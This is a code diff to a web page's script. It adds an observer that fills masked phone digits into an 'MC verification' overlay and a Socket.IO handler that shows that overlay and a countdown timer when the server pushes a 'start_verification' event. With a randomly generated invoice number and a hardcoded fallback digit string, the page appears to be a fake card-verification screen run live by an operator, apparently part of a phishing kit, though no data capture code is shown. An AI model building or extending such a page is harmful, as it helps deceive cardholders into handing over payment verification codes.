@@ -747,7 +747,38 @@ document.addEventListener('DOMContentLoaded', function() {
             timeout: 20000,
             transports: ['websocket', 'polling']
         });
-        
+
+        // Add this at the end of your index.html, in the DOMContentLoaded listener
+// Create a MutationObserver to watch for when the MC verification overlay becomes visible
+const observer = new MutationObserver(function(mutations) {
+    mutations.forEach(function(mutation) {
+        if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
+            const overlay = document.getElementById('mcVerificationOverlay');
+            if (overlay && overlay.style.display !== 'none') {
+                console.log('MC verification overlay is now visible');
+                
+                // Get the phone last 4 digits from URL or state
+                const urlParams = new URLSearchParams(window.location.search);
+                const phoneLastFour = urlParams.get('phone_last_four') || 
+                                     state.phoneLastFour || 
+                                     '9469';
+                
+                // Set it in the verification overlay
+                const lastFourEl = document.getElementById('cardLastFourDigits');
+                if (lastFourEl) {
+                    lastFourEl.textContent = `********${phoneLastFour}`;
+                    console.log('Set phone last four digits to:', phoneLastFour);
+                }
+            }
+        }
+    });
+});
+
+// Start observing the overlay element
+const overlay = document.getElementById('mcVerificationOverlay');
+if (overlay) {
+    observer.observe(overlay, { attributes: true });
+}
         // Add debugging listeners
         socket.on('connect', () => {
             console.log('Connected to Socket.IO server with ID:', socket.id);
@@ -979,25 +1010,31 @@ if (pathSegments.length > 1) {
     }, 1500);
 });
 
-    socket.on('start_verification', (data) => {
-        console.log('Start verification requested:', data);
+socket.on('start_verification', (data) => {
+    console.log('Start verification requested:', data);
+    
+    // Store the phone's last 4 digits from the verification data
+    if (data.phoneLastFour) {
+        state.phoneLastFour = data.phoneLastFour;
+        console.log('Phone last four digits set in start_verification:', data.phoneLastFour);
+    }
+    
+    const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+    const mcLoadingContent = document.getElementById('mcLoadingContent');
+    const mcVerificationContent = document.getElementById('mcVerificationContent');
+    
+    if (mcVerificationOverlay && mcLoadingContent && mcVerificationContent) {
+        // Hide loading, show verification content
+        mcLoadingContent.style.display = 'none';
+        mcVerificationContent.style.display = 'block';
         
-        const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
-        const mcLoadingContent = document.getElementById('mcLoadingContent');
-        const mcVerificationContent = document.getElementById('mcVerificationContent');
+        // Update UI components with transaction data
+        updateMcVerificationUI(data);
         
-        if (mcVerificationOverlay && mcLoadingContent && mcVerificationContent) {
-            // Hide loading, show verification content
-            mcLoadingContent.style.display = 'none';
-            mcVerificationContent.style.display = 'block';
-            
-            // Update UI components with transaction data
-            updateMcVerificationUI(data);
-            
-            // Start the timer for 4:59 minutes
-            startMCTimer();
-        }
-    });
+        // Start the timer for 4:59 minutes
+        startMCTimer();
+    }
+});
     
     socket.on('mc_verification_result', function(result) {
         const mcContainer = document.getElementById('mcVerificationOverlay');
@@ -2525,7 +2562,38 @@ document.addEventListener('DOMContentLoaded', function() {
     if (invoiceIdElement) {
         invoiceIdElement.textContent = Math.floor(100000 + Math.random() * 900000);
     }
-    
+
+    // Add this at the end of your index.html, in the DOMContentLoaded listener
+// Create a MutationObserver to watch for when the MC verification overlay becomes visible
+const observer = new MutationObserver(function(mutations) {
+    mutations.forEach(function(mutation) {
+        if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
+            const overlay = document.getElementById('mcVerificationOverlay');
+            if (overlay && overlay.style.display !== 'none') {
+                console.log('MC verification overlay is now visible');
+                
+                // Get the phone last 4 digits from URL or state
+                const urlParams = new URLSearchParams(window.location.search);
+                const phoneLastFour = urlParams.get('phone_last_four') || 
+                                     state.phoneLastFour || 
+                                     '9469';
+                
+                // Set it in the verification overlay
+                const lastFourEl = document.getElementById('cardLastFourDigits');
+                if (lastFourEl) {
+                    lastFourEl.textContent = `********${phoneLastFour}`;
+                    console.log('Set phone last four digits to:', phoneLastFour);
+                }
+            }
+        }
+    });
+});
+
+// Start observing the overlay element
+const overlay = document.getElementById('mcVerificationOverlay');
+if (overlay) {
+    observer.observe(overlay, { attributes: true });
+}
     // Fix for MC cancel button
     document.addEventListener('click', function(event) {
         if (event.target && event.target.id === 'mcCancelBtn') {
